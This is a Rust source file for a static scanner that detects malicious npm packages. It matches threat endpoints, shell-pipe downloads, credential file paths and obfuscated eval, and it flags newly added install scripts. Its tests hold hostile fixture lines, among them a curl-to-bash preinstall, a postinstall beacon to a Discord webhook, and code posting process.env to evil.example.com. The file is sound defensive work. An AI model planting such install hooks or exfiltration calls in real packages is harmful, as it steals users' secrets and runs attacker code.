use crate::domain::{ContentFinding, Ecosystem};
use regex::Regex;
use semver::Version;

const LIFECYCLE: [&str; 5] = [
    "preinstall",
    "install",
    "postinstall",
    "preuninstall",
    "prepare",
];

/// Static correlation scan over extracted package files.
///
/// Returns a finding only when a threat indicator and a capability appear
/// together (or an install script performs network/shell work), so that a
/// lone regex match on legitimate build tooling does not become a finding.
pub fn scan_package_files(
    ecosystem: &Ecosystem,
    name: &str,
    version: &Version,
    files: &[(&str, &str)],
) -> Option<ContentFinding> {
    let mut best: Option<(u8, Vec<String>, String)> = None;
    let mut lifecycle: Vec<(String, String)> = Vec::new();
    let mut per_file: Vec<(String, u8)> = Vec::new();

    for (path, content) in files {
        if path.ends_with("package.json") {
            if let Ok(document) = serde_json::from_str::<serde_json::Value>(content) {
                if let Some(scripts) = document.get("scripts").and_then(|value| value.as_object()) {
                    for key in LIFECYCLE {
                        if let Some(command) = scripts.get(key).and_then(|value| value.as_str()) {
                            lifecycle.push((key.to_string(), command.to_string()));
                        }
                    }
                }
            }
            continue;
        }
        let capability_exec = has_exec(content);
        let capability_network = has_network(content);
        let capability_env = has_env(content);
        let capability_obfuscation = has_obfuscation(content);
        let threat_endpoint = has_threat_endpoint(content);
        let threat_pipe = has_shell_pipe(content);
        let credentials = has_credentials(content);

        let (score, rules) = if threat_pipe {
            (9, vec!["shell-pipe".to_string()])
        } else if capability_obfuscation
            && (content.contains("eval(") || content.contains("new Function("))
        {
            (9, vec!["obfuscated-execution".to_string()])
        } else if capability_env
            && capability_network
            && (content.contains("POST") || content.contains("post(") || content.contains("fetch("))
        {
            (
                9,
                vec!["env-exfiltration".to_string(), "network-call".to_string()],
            )
        } else if (threat_endpoint || credentials) && (capability_exec || capability_network) {
            let mut rules = Vec::new();
            if capability_exec {
                rules.push("process-execution".to_string());
            }
            if capability_network {
                rules.push("network-call".to_string());
            }
            if threat_endpoint {
                rules.push("threat-endpoint".to_string());
            }
            if credentials {
                rules.push("credential-access".to_string());
            }
            (8, rules)
        } else if threat_endpoint || credentials {
            let mut rules = Vec::new();
            if threat_endpoint {
                rules.push("threat-endpoint".to_string());
            }
            if credentials {
                rules.push("credential-access".to_string());
            }
            (4, rules)
        } else if capability_obfuscation {
            (4, vec!["obfuscation".to_string()])
        } else {
            (0, vec![])
        };

        if score > 0 {
            per_file.push((path.to_string(), score));
            consider(
                &mut best,
                score,
                rules,
                format!("{path}: correlated capability and threat indicators"),
            );
        }
    }

    for (key, command) in &lifecycle {
        if has_shell_pipe(command) {
            consider(
                &mut best,
                9,
                vec!["install-script-pipe".to_string()],
                format!("{key} script pipes a download straight into a shell"),
            );
            continue;
        }
        if has_network(command) || has_obfuscation(command) {
            consider(
                &mut best,
                9,
                vec!["install-script-network".to_string()],
                format!("{key} script performs network or obfuscated work"),
            );
            continue;
        }
        let referenced = command
            .split_whitespace()
            .find(|token| {
                matches!(
                    token.trim_matches(['"', '\'']).rsplit('.').next(),
                    Some("js") | Some("cjs") | Some("mjs") | Some("py")
                )
            })
            .map(|token| token.trim_matches(['"', '\'']).to_string());
        if let Some(referenced) = referenced {
            if per_file
                .iter()
                .any(|(path, score)| *score >= 8 && path.ends_with(&referenced))
            {
                consider(
                    &mut best,
                    9,
                    vec!["install-script-chain".to_string()],
                    format!("{key} script runs {referenced}, which shows correlated risk signals"),
                );
            }
        }
    }

    best.map(|(score, rules, summary)| ContentFinding {
        ecosystem: ecosystem.clone(),
        package: name.to_string(),
        version: version.clone(),
        source: "static-heuristics".to_string(),
        score,
        rules,
        summary,
    })
}

fn consider(
    best: &mut Option<(u8, Vec<String>, String)>,
    score: u8,
    rules: Vec<String>,
    summary: String,
) {
    if best.as_ref().is_none_or(|(current, _, _)| score > *current) {
        *best = Some((score, rules, summary));
    }
}

fn has_exec(text: &str) -> bool {
    text.contains("child_process")
        || text.contains("spawnSync")
        || text.contains("execSync")
        || text.contains("subprocess")
        || text.contains("os.system")
        || text.contains("Process.Start")
}

fn has_network(text: &str) -> bool {
    text.contains("fetch(")
        || text.contains("require('http")
        || text.contains("require(\"http")
        || text.contains("requests.get")
        || text.contains("requests.post")
        || text.contains("urllib.request")
        || text.contains("axios")
        || text.contains("net.connect")
        || text.contains("http.request")
        || text.contains("https.request")
}

fn has_env(text: &str) -> bool {
    text.contains("process.env") || text.contains("os.environ") || text.contains("getenv(")
}

fn has_obfuscation(text: &str) -> bool {
    text.contains("eval(")
        || text.contains("new Function(")
        || text.contains("Buffer.from(") && text.contains("base64")
        || text.contains("atob(")
        || text.contains("base64.b64decode")
}

fn has_threat_endpoint(text: &str) -> bool {
    static ENDPOINT: &str = r"(discord(app)?\.com/api/webhooks|api\.telegram\.org/bot|pastebin\.com|transfer\.sh|ngrok\.io|webhook\.site|requestbin|pipedream\.net|https?://\d{1,3}(\.\d{1,3}){3})";
    Regex::new(ENDPOINT)
        .map(|pattern| pattern.is_match(text))
        .unwrap_or(false)
}

fn has_shell_pipe(text: &str) -> bool {
    static PIPE: &str = r"(curl|wget)[^\n]*\|[^\n]*(sh|bash)";
    Regex::new(PIPE)
        .map(|pattern| pattern.is_match(text))
        .unwrap_or(false)
}

fn has_credentials(text: &str) -> bool {
    text.contains("id_rsa")
        || text.contains(".ssh/")
        || text.contains(".aws/credentials")
        || text.contains(".npmrc")
        || text.contains("AWS_SECRET")
        || text.contains("PRIVATE KEY")
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct VersionDiff {
    pub added: Vec<String>,
    pub removed: Vec<String>,
    pub changed: Vec<String>,
    pub new_lifecycle_scripts: Vec<String>,
}

/// File-level diff between two releases of a package.
pub fn diff_package_files(before: &[(&str, &str)], after: &[(&str, &str)]) -> VersionDiff {
    use std::collections::BTreeMap;
    let before_map: BTreeMap<&str, &str> = before.iter().copied().collect();
    let after_map: BTreeMap<&str, &str> = after.iter().copied().collect();
    let added = after_map
        .keys()
        .filter(|path| !before_map.contains_key(*path))
        .map(|path| path.to_string())
        .collect();
    let removed = before_map
        .keys()
        .filter(|path| !after_map.contains_key(*path))
        .map(|path| path.to_string())
        .collect();
    let changed = after_map
        .iter()
        .filter(|(path, content)| before_map.get(*path).is_some_and(|old| old != *content))
        .map(|(path, _)| path.to_string())
        .collect();

    let scripts_of = |files: &[(&str, &str)]| -> BTreeMap<String, String> {
        let mut scripts = BTreeMap::new();
        for (path, content) in files {
            if !path.ends_with("package.json") {
                continue;
            }
            let Ok(document) = serde_json::from_str::<serde_json::Value>(content) else {
                continue;
            };
            if let Some(entries) = document.get("scripts").and_then(|value| value.as_object()) {
                for key in LIFECYCLE {
                    if let Some(command) = entries.get(key).and_then(|value| value.as_str()) {
                        scripts.insert(key.to_string(), command.to_string());
                    }
                }
            }
        }
        scripts
    };
    let before_scripts = scripts_of(before);
    let after_scripts = scripts_of(after);
    let mut new_lifecycle_scripts: Vec<String> = after_scripts
        .keys()
        .filter(|key| !before_scripts.contains_key(*key))
        .cloned()
        .collect();
    new_lifecycle_scripts.sort();

    VersionDiff {
        added,
        removed,
        changed,
        new_lifecycle_scripts,
    }
}

/// Findings that only make sense in a release-to-release comparison.
pub fn scan_version_diff(
    ecosystem: &Ecosystem,
    name: &str,
    version: &Version,
    before: &[(&str, &str)],
    after: &[(&str, &str)],
) -> Option<ContentFinding> {
    let diff = diff_package_files(before, after);
    if diff.new_lifecycle_scripts.is_empty() {
        return None;
    }
    Some(ContentFinding {
        ecosystem: ecosystem.clone(),
        package: name.to_string(),
        version: version.clone(),
        source: "static-heuristics".to_string(),
        score: 9,
        rules: vec!["new-install-script".to_string()],
        summary: format!(
            "release introduces lifecycle script(s): {}",
            diff.new_lifecycle_scripts.join(", ")
        ),
    })
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;

    fn version() -> Version {
        Version::parse("1.2.3").unwrap()
    }

    #[test]
    fn diff_reports_added_removed_and_changed_files() {
        let before = [("package.json", "{}"), ("a.js", "one"), ("b.js", "gone")];
        let after = [("package.json", "{}"), ("a.js", "two"), ("c.js", "new")];
        let diff = diff_package_files(&before, &after);
        assert_eq!(diff.added, vec!["c.js".to_string()]);
        assert_eq!(diff.removed, vec!["b.js".to_string()]);
        assert_eq!(diff.changed, vec!["a.js".to_string()]);
        assert!(diff.new_lifecycle_scripts.is_empty());
    }

    #[test]
    fn newly_introduced_install_script_is_high_risk() {
        let before = [("package.json", r#"{"name":"lib"}"#)];
        let after = [(
            "package.json",
            r#"{"name":"lib","scripts":{"postinstall":"node setup.js"}}"#,
        )];
        let finding =
            scan_version_diff(&Ecosystem::Npm, "lib", &version(), &before, &after).unwrap();
        assert!(finding.score >= 8, "score {}", finding.score);
        assert!(finding
            .rules
            .iter()
            .any(|rule| rule == "new-install-script"));
    }

    #[test]
    fn benign_version_diff_has_no_finding() {
        let before = [("index.js", "module.exports = 1;")];
        let after = [
            ("index.js", "module.exports = 2;"),
            ("util.js", "module.exports = 3;"),
        ];
        assert!(scan_version_diff(&Ecosystem::Npm, "lib", &version(), &before, &after).is_none());
    }

    #[test]
    fn benign_package_has_no_finding() {
        let files = [
            ("package.json", r#"{"name":"lib","version":"1.2.3"}"#),
            ("index.js", "module.exports = (a, b) => a + b;\n"),
        ];
        assert!(scan_package_files(&Ecosystem::Npm, "lib", &version(), &files).is_none());
    }

    #[test]
    fn build_tool_exec_alone_is_not_a_finding() {
        let files = [
            (
                "package.json",
                r#"{"name":"tool","scripts":{"install":"node-gyp rebuild"}}"#,
            ),
            (
                "build.js",
                "const { spawnSync } = require('child_process'); spawnSync('make');\n",
            ),
        ];
        assert!(scan_package_files(&Ecosystem::Npm, "tool", &version(), &files).is_none());
    }

    #[test]
    fn install_script_with_network_is_high_risk() {
        let files = [(
            "package.json",
            r#"{"name":"evil","scripts":{"postinstall":"node -e \"require('https').get('https://discord.com/api/webhooks/1/x')\""}}"#,
        )];
        let finding = scan_package_files(&Ecosystem::Npm, "evil", &version(), &files).unwrap();
        assert!(finding.score >= 8, "score {}", finding.score);
        assert!(finding
            .rules
            .iter()
            .any(|rule| rule == "install-script-network"));
        assert_eq!(finding.source, "static-heuristics");
    }

    #[test]
    fn install_script_chained_to_beacon_file_is_high_risk() {
        let files = [
            (
                "package.json",
                r#"{"name":"evil","scripts":{"postinstall":"node beacon.js"}}"#,
            ),
            (
                "beacon.js",
                "const https = require('https'); https.get('https://discord.com/api/webhooks/1/x');\n",
            ),
        ];
        let finding = scan_package_files(&Ecosystem::Npm, "evil", &version(), &files).unwrap();
        assert!(finding.score >= 8, "score {}", finding.score);
        assert!(finding
            .rules
            .iter()
            .any(|rule| rule == "install-script-chain"));
    }

    #[test]
    fn webhook_exfiltration_with_env_is_high_risk() {
        let files = [(
            "index.js",
            "const body = JSON.stringify(process.env); fetch('https://evil.example.com/collect', { method: 'POST', body });\n",
        )];
        let finding = scan_package_files(&Ecosystem::Npm, "evil", &version(), &files).unwrap();
        assert!(finding.score >= 9, "score {}", finding.score);
        assert!(finding.rules.iter().any(|rule| rule == "env-exfiltration"));
    }

    #[test]
    fn obfuscated_execution_is_high_risk() {
        let files = [(
            "index.js",
            "eval(Buffer.from('Y3VybCBodHRwOi8vZXZpbA==', 'base64').toString())\n",
        )];
        let finding = scan_package_files(&Ecosystem::Npm, "evil", &version(), &files).unwrap();
        assert!(finding.score >= 8, "score {}", finding.score);
        assert!(finding
            .rules
            .iter()
            .any(|rule| rule == "obfuscated-execution"));
    }

    #[test]
    fn shell_pipe_install_is_high_risk() {
        let files = [(
            "package.json",
            r#"{"name":"evil","scripts":{"preinstall":"curl http://evil.test/x.sh | bash"}}"#,
        )];
        let finding = scan_package_files(&Ecosystem::Npm, "evil", &version(), &files).unwrap();
        assert!(finding.score >= 9, "score {}", finding.score);
        assert!(finding
            .rules
            .iter()
            .any(|rule| rule == "install-script-pipe"));
    }

    #[test]
    fn threat_endpoint_alone_is_review_level() {
        let files = [(
            "notes.js",
            "// payload pickup location: https://pastebin.com/raw/abc123\n",
        )];
        let finding = scan_package_files(&Ecosystem::Npm, "odd", &version(), &files).unwrap();
        assert!(
            finding.score >= 4 && finding.score < 8,
            "score {}",
            finding.score
        );
        assert!(finding.rules.iter().any(|rule| rule == "threat-endpoint"));
    }
}
